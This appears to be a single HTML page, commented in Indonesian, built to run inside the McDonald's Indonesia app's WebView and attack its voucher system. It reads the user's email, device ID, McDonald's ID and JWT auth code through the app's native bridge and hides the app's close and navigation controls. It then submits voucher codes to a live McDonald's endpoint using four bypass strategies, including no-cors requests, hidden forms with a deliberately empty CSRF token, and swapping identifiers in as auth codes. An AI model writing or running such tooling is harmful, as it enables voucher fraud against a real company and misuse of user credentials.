  <head>

    <title>McD Voucher Tester v3 — Single HTML</title>
    <style>
      * {
        box-sizing: border-box;
      }
      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", monospace;
        background: #0f1115;
        color: #e4e6eb;
        padding: 12px;
        margin: 0;
        font-size: 13px;
        line-height: 1.5;
      }
      .container {
        max-width: 920px;
        margin: 0 auto;
      }
      h1 {
        font-size: 16px;
        color: #c02101;
        margin: 0 0 12px;
        padding-bottom: 6px;
        border-bottom: 1px solid #2a2d35;
      }
      .grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 10px;
        margin-bottom: 12px;
      }
      .section {
        margin-bottom: 8px;
      }
      .label {
        color: #8b919e;
        font-size: 10px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        margin-bottom: 3px;
      }
      .value {
        background: #1a1d24;
        padding: 6px 8px;
        border-radius: 3px;
        border-left: 2px solid #c02101;
        word-break: break-all;
        font-family: "SF Mono", Monaco, Consolas, monospace;
        font-size: 11px;
        min-height: 16px;
      }
      .value.empty {
        color: #555;
      }
      .value.ok {
        border-left-color: #4caf50;
        color: #4caf50;
      }
      .value.error {
        border-left-color: #f44336;
        color: #f44336;
      }
      .value.warn {
        border-left-color: #ff9800;
        color: #ff9800;
      }

      .input-row {
        display: flex;
        gap: 6px;
        margin: 12px 0;
      }
      input.voucher {
        flex: 1;
        padding: 10px 12px;
        background: #1a1d24;
        border: 1px solid #2a2d35;
        border-radius: 3px;
        color: #fff;
        font-size: 14px;
        font-family: monospace;
        letter-spacing: 1px;
        text-transform: uppercase;
      }
      input.voucher:focus {
        outline: none;
        border-color: #c02101;
      }

      button {
        padding: 10px 16px;
        background: #c02101;
        color: white;
        border: none;
        border-radius: 3px;
        font-size: 12px;
        font-weight: bold;
        cursor: pointer;
        min-width: 130px;
      }
      button:disabled {
        background: #2a2d35;
        color: #555;
        cursor: not-allowed;
      }
      button.ghost {
        background: #2a2d35;
        color: #fff;
        min-width: auto;
        padding: 6px 10px;
        font-size: 11px;
      }
      button:not(:disabled):hover {
        background: #d6260c;
      }
      button.ghost:hover {
        background: #3a3d45;
      }

      .strategies {
        display: flex;
        gap: 6px;
        flex-wrap: wrap;
        margin-bottom: 8px;
      }

      .log-box {
        background: #000;
        border: 1px solid #2a2d35;
        border-radius: 3px;
        padding: 8px;
        height: 220px;
        overflow-y: auto;
        font-family: "SF Mono", Monaco, Consolas, monospace;
        font-size: 10px;
        line-height: 1.5;
      }
      .log-line {
        white-space: pre-wrap;
        word-break: break-word;
      }
      .log-line.sys {
        color: #8b919e;
      }
      .log-line.info {
        color: #61dafb;
      }
      .log-line.ok {
        color: #4caf50;
      }
      .log-line.fail {
        color: #f44336;
      }
      .log-line.warn {
        color: #ff9800;
      }
      .log-line .ts {
        color: #555;
      }

      .iframe-wrap {
        margin-top: 8px;
        border: 1px solid #2a2d35;
        border-radius: 3px;
        overflow: hidden;
        background: #fff;
      }

        background: #2a2d35;
        color: #fff;
        padding: 4px 8px;
        font-size: 10px;
        display: flex;
        justify-content: space-between;
        align-items: center;
      }

        width: 100%;

        background: #fff;

        font-size: 9px;

        text-transform: uppercase;
      }

        color: #fff;

  <body>
    <div class="container">
      <h1>McD Voucher Tester v3 — Single HTML (Multi-Strategy)</h1>

      <div class="grid">
        <div class="section">
          <div class="label">Bridge Status</div>
          <div id="bridge-status" class="value empty">
            Menunggu <span class="badge wait">WAITING</span>
          </div>
        </div>
        <div class="section">
          <div class="label">Base URL</div>
          <div class="value ok">https://bts-360.mcdonalds.co.id</div>
        </div>
        <div class="section">
          <div class="label">Email</div>
          <div id="user-email" class="value empty">-</div>
        </div>
        <div class="section">
          <div class="label">Device ID</div>
          <div id="user-device" class="value empty">-</div>
        </div>
        <div class="section">
          <div class="label">Nama</div>
          <div id="user-name" class="value empty">-</div>
        </div>
        <div class="section">
          <div class="label">McDonalds ID</div>
          <div id="mcd-id" class="value empty">-</div>
        </div>
        <div class="section" style="grid-column: 1 / -1">
          <div class="label">JWT AuthCode (refresh tiap klik tombol)</div>
          <div id="jwt-authcode" class="value empty">-</div>
        </div>
      </div>

      <div class="input-row">
        <input
          type="text"
          id="voucher-input"
          class="voucher"
          placeholder="CONTOH: ZXCV"
          autocomplete="off"
          spellcheck="false"
        />
        <button id="get-authcode-btn" class="ghost">Get AuthCode</button>
      </div>

      <div class="strategies">
        <button id="strategy-fetch" disabled="">1. Fetch no-cors</button>
        <button id="strategy-form-iframe" disabled="">2. Form → Iframe</button>
        <button id="strategy-form-top" disabled="">3. Form → Top</button>
        <button id="strategy-mcdid" disabled="">4. Pakai mcdonaldsId</button>
      </div>

      <div class="section">
        <div class="label">Log</div>
        <div id="log" class="log-box"></div>
      </div>

      <div class="iframe-wrap">
        <div class="iframe-header">
          <span>Response Frame (untuk Strategy 2)</span>
          <button class="ghost" id="clear-iframe">Clear</button>
        </div>
        <iframe name="responseFrame" id="responseFrame"></iframe>
      </div>
    </div>

    <!-- Hidden form untuk strategy 2 & 3 -->
    <form
      id="claimForm"
      method="POST"
      action="https://bts-360.mcdonalds.co.id/cas/check-voucher"
      target="responseFrame"
    >
      <input type="hidden" name="email" id="f-email" value="" />
      <input type="hidden" name="deviceId" id="f-deviceId" value="" />
      <input type="hidden" name="voucher" id="f-voucher" value="" />
      <input type="hidden" name="authorizationCode" id="f-authCode" value="" />
      <!-- _token sengaja kosong — lihat apakah /cas/* di-exclude dari CSRF -->
      <input type="hidden" name="_token" value="" />
    </form>

    <script>
      (function () {
        "use strict";

        var BASE_URL = "https://bts-360.mcdonalds.co.id";
        var FALLBACK_CLIENT_ID = "8f908eccbe018b43ca7d5c53739c48a1";

        var clientId = null;
        var jwtAuthCode = "";
        var email = "";
        var deviceId = "";
        var mcdonaldsId = "";
        var firstname = "";
        var lastname = "";
        var bridgeReady = false;
        var clicked = false;

        function log(msg, type) {
          type = type || "sys";
          var box = document.getElementById("log");
          var time = new Date().toLocaleTimeString("id-ID", { hour12: false });
          var div = document.createElement("div");
          div.className = "log-line " + type;
          div.innerHTML = '<span class="ts">[' + time + "]</span> " + msg;
          box.appendChild(div);
          box.scrollTop = box.scrollHeight;
        }

        function setValue(id, value, cls) {
          var el = document.getElementById(id);
          if (!el) return;
          if (value === null || value === undefined || value === "") {
            el.textContent = "-";
            el.className = "value empty";
          } else {
            el.textContent = String(value);
            el.className = "value" + (cls ? " " + cls : "");
          }
        }

        function setBridgeStatus(state) {
          var el = document.getElementById("bridge-status");
          var badge =
            state === "on"
              ? '<span class="badge on">ACTIVE</span>'
              : '<span class="badge wait">WAITING</span>';
          el.innerHTML = badge;
          el.className = "value " + (state === "on" ? "ok" : "empty");
        }

        function getBridgeRoot() {
          if (window.mcd && window.mcd.bridge) return window.mcd.bridge;
          if (window.GMA_Lite && window.GMA_Lite.bridge)
            return window.GMA_Lite.bridge;
          if (window.__GMALITE_BRIDGE__) return window.__GMALITE_BRIDGE__;
          return null;
        }

        function enableStrategyButtons(enable) {
          [
            "strategy-fetch",
            "strategy-form-iframe",
            "strategy-form-top",
            "strategy-mcdid",
          ].forEach(function (id) {
            document.getElementById(id).disabled = !enable;
          });
        }

        function getAuthCode() {
          return new Promise(function (resolve, reject) {
            if (!clientId) {
              log(
                "clientId null, pakai fallback: " + FALLBACK_CLIENT_ID,
                "warn",
              );
              clientId = FALLBACK_CLIENT_ID;
            }
            log("Bridge: user.getAuthCode clientId=" + clientId, "info");
            var userConnector = mcd.bridge.message("user");
            userConnector.send({ getAuthCode: true, clientId: clientId });

            userConnector.on("data", function (data) {
              log(
                "authCode.data: " + JSON.stringify(data).substring(0, 400),
                "info",
              );
              jwtAuthCode = (data && data.authCode) || "";
              if (jwtAuthCode) {
                setValue(
                  "jwt-authcode",
                  jwtAuthCode.substring(0, 100) +
                    "... (" +
                    jwtAuthCode.length +
                    " chars)",
                  "ok",
                );
                log("JWT AuthCode OK, length=" + jwtAuthCode.length, "ok");
                resolve(jwtAuthCode);
              } else {
                setValue("jwt-authcode", "NO AUTHCODE", "error");
                log("Response tidak berisi authCode", "fail");
                reject(new Error("no authCode"));
              }
            });

            userConnector.on("error", function (error) {
              log("authCode.error: " + JSON.stringify(error), "fail");
              reject(error);
            });
          });
        }

        function getUserData() {
          return new Promise(function (resolve, reject) {
            log("Bridge: user.getuser", "info");
            var userConnector = mcd.bridge.message("user");
            var result = {};
            userConnector.send({ getuser: true });

            userConnector.on("data", function (data) {
              log("user.data: " + JSON.stringify(data), "info");
              if (!data) return;
              if (data.email) {
                email = data.email;
                setValue("user-email", email, "ok");
              }
              if (data.deviceId) {
                deviceId = data.deviceId;
                setValue("user-device", deviceId, "ok");
              }
              if (data.firstname || data.lastname) {
                firstname = data.firstname || "";
                lastname = data.lastname || "";
                setValue(
                  "user-name",
                  (firstname + " " + lastname).trim(),
                  "ok",
                );
              }
              if (data.mcdonaldsId) {
                mcdonaldsId = data.mcdonaldsId;
                setValue("mcd-id", mcdonaldsId, "ok");
              }
              result = data;
            });

            userConnector.on("error", function (error) {
              log("user.error: " + JSON.stringify(error), "fail");
              reject(error);
            });

            userConnector.on("done", function () {
              log("user.done", "ok");
              resolve(result);
            });
          });
        }

        // ============ STRATEGY 1: fetch mode:'no-cors' ============
        // Fire-and-forget. Server proses request, response opaque (tidak bisa dibaca).
        // Cek hasil lewat app McD (kupon baru muncul = sukses).
        async function strategyFetchNoCors(voucherCode, authCode) {
          log("--- STRATEGY 1: fetch no-cors ---", "sys");
          log("POST " + BASE_URL + "/cas/check-voucher", "info");
          log("Body: email, deviceId, voucher, authorizationCode", "info");
          log(
            "Note: response opaque, tidak bisa dibaca. Cek app McD untuk verifikasi.",
            "warn",
          );
          try {
            var res = await fetch(BASE_URL + "/cas/check-voucher", {
              method: "POST",
              mode: "no-cors",
              headers: { "Content-Type": "application/x-www-form-urlencoded" },
              body: new URLSearchParams({
                email: email,
                deviceId: deviceId,
                voucher: voucherCode,
                authorizationCode: authCode,
              }),
            });
            log(
              "fetch selesai. type=" +
                res.type +
                " status=" +
                res.status +
                " (opaque biasanya status=0)",
              "info",
            );
            log(
              "Kalau voucher muncul di app McD dalam 1-2 menit → sukses",
              "ok",
            );
          } catch (e) {
            log(
              "Strategy 1 gagal: " + (e && e.message ? e.message : e),
              "fail",
            );
          }
        }

        // ============ STRATEGY 2: Form submit ke iframe ============
        // Form bypass CORS + kirim cookies otomatis.
        // Response tampil di iframe (visual feedback).
        async function strategyFormIframe(voucherCode, authCode) {
          log("--- STRATEGY 2: Form POST → iframe ---", "sys");
          log(
            "Form mengirim cookies bts-360 (WAF + Laravel session) otomatis",
            "info",
          );
          log(
            "_token sengaja kosong — lihat apakah /cas/* excluded dari CSRF",
            "warn",
          );

          document.getElementById("f-email").value = email;
          document.getElementById("f-deviceId").value = deviceId;
          document.getElementById("f-voucher").value = voucherCode;
          document.getElementById("f-authCode").value = authCode;

          var form = document.getElementById("claimForm");
          form.target = "responseFrame";
          form.action = BASE_URL + "/cas/check-voucher";
          form.submit();
          log("Form submitted ke iframe. Lihat response di bawah.", "info");
        }

        // ============ STRATEGY 3: Form submit ke top (navigate WebView) ============
        // Form submit, navigasi seluruh WebView ke halaman response.
        // User lihat hasil langsung di layar penuh.
        async function strategyFormTop(voucherCode, authCode) {
          log("--- STRATEGY 3: Form POST → _top (navigate) ---", "sys");
          log("WebView akan navigasi ke /cas/check-voucher response", "warn");
          log("Tombol back app McD untuk kembali ke HTML ini", "warn");

          document.getElementById("f-email").value = email;
          document.getElementById("f-deviceId").value = deviceId;
          document.getElementById("f-voucher").value = voucherCode;
          document.getElementById("f-authCode").value = authCode;

          var form = document.getElementById("claimForm");
          form.target = "_top";
          form.action = BASE_URL + "/cas/check-voucher";
          form.submit();
        }

        // ============ STRATEGY 4: Pakai mcdonaldsId sbg authCode ============
        // Skip getAuthCode, langsung pakai Bearer token dari getuser.
        async function strategyMcdId(voucherCode) {
          if (!mcdonaldsId) {
            log("mcdonaldsId belum ada", "fail");
            return;
          }
          log("--- STRATEGY 4: Form POST pakai mcdonaldsId ---", "sys");
          log("authCode = mcdonaldsId (Bearer token dari bridge)", "info");
          await strategyFormIframe(voucherCode, mcdonaldsId);
        }

        // ============ GET AUTHCODE BUTTON ============
        document
          .getElementById("get-authcode-btn")
          .addEventListener("click", async function () {
            this.disabled = true;
            this.textContent = "Getting...";
            try {
              await getAuthCode();
            } catch (e) {
              log("Gagal: " + e, "fail");
            }
            this.disabled = false;
            this.textContent = "Get AuthCode";
          });

        // ============ STRATEGY BUTTONS ============
        document
          .getElementById("strategy-fetch")
          .addEventListener("click", async function () {
            var v = (document.getElementById("voucher-input").value || "")
              .trim()
              .toUpperCase();
            if (!v) {
              log("Isi voucher dulu", "warn");
              return;
            }
            if (!jwtAuthCode) {
              log("JWT belum ada, ambil dulu...", "warn");
              try {
                await getAuthCode();
              } catch (e) {
                return;
              }
            }
            await strategyFetchNoCors(v, jwtAuthCode);
          });

        document
          .getElementById("strategy-form-iframe")
          .addEventListener("click", async function () {
            var v = (document.getElementById("voucher-input").value || "")
              .trim()
              .toUpperCase();
            if (!v) {
              log("Isi voucher dulu", "warn");
              return;
            }
            if (!jwtAuthCode) {
              log("JWT belum ada, ambil dulu...", "warn");
              try {
                await getAuthCode();
              } catch (e) {
                return;
              }
            }
            await strategyFormIframe(v, jwtAuthCode);
          });

        document
          .getElementById("strategy-form-top")
          .addEventListener("click", async function () {
            var v = (document.getElementById("voucher-input").value || "")
              .trim()
              .toUpperCase();
            if (!v) {
              log("Isi voucher dulu", "warn");
              return;
            }
            if (!jwtAuthCode) {
              log("JWT belum ada, ambil dulu...", "warn");
              try {
                await getAuthCode();
              } catch (e) {
                return;
              }
            }
            await strategyFormTop(v, jwtAuthCode);
          });

        document
          .getElementById("strategy-mcdid")
          .addEventListener("click", async function () {
            var v = (document.getElementById("voucher-input").value || "")
              .trim()
              .toUpperCase();
            if (!v) {
              log("Isi voucher dulu", "warn");
              return;
            }
            await strategyMcdId(v);
          });

        document
          .getElementById("clear-iframe")
          .addEventListener("click", function () {
            document.getElementById("responseFrame").src = "about:blank";
          });

        // ============ MAIN: mcdBridgeReady ============
        document.addEventListener("mcdBridgeReady", async function () {
          log("mcdBridgeReady fired", "ok");
          setBridgeStatus("on");
          bridgeReady = true;

          // Hide McD UI
          try {
            var system = mcd.bridge.message("system");
            system.send({ hideNavigationbar: true, hideCloseButton: true });
            log("system.send hideNavigationbar + hideCloseButton", "info");
          } catch (e) {}

          // clientId pakai fallback (cas/configuration kemungkinan WAF block)
          clientId = FALLBACK_CLIENT_ID;
          log("clientId pakai fallback: " + clientId, "warn");

          // Get user data
          try {
            await getUserData();
          } catch (e) {
            log("Gagal ambil user data", "fail");
          }

          // Enable strategy buttons (semua strategy butuh email+deviceId)
          if (email && deviceId) {
            enableStrategyButtons(true);
            log("=== SIAP — pilih strategy di bawah ===", "ok");
            log(
              "Strategy 1: fetch no-cors (fire & forget, cek app McD)",
              "info",
            );
            log(
              "Strategy 2: Form ke iframe (response di kotak putih bawah)",
              "info",
            );
            log(
              "Strategy 3: Form ke _top (navigasi WebView, lihat hasil fullscreen)",
              "info",
            );
            log(
              "Strategy 4: Form pakai mcdonaldsId sbg authCode (skip getAuthCode)",
              "info",
            );
          } else {
            log("email/deviceId belum lengkap", "fail");
          }
        });

        // Fallback kalau bridge sudah ready sebelum listener dipasang
        if (getBridgeRoot()) {
          log("Bridge sudah tersedia, trigger manual", "warn");
          setTimeout(function () {
            if (!bridgeReady) {
              document.dispatchEvent(new Event("mcdBridgeReady"));
            }
          }, 500);
        }

        log("Page loaded. Base URL: " + BASE_URL, "sys");
        log("Fallback clientId: " + FALLBACK_CLIENT_ID, "sys");
        log("Menunggu mcdBridgeReady...", "sys");
        log(
          "Tip: kalau fetch /cas/* gagal, pakai Strategy 2 atau 3 (form)",
          "warn",
        );
      })();
    </script>
  </body>
</html>
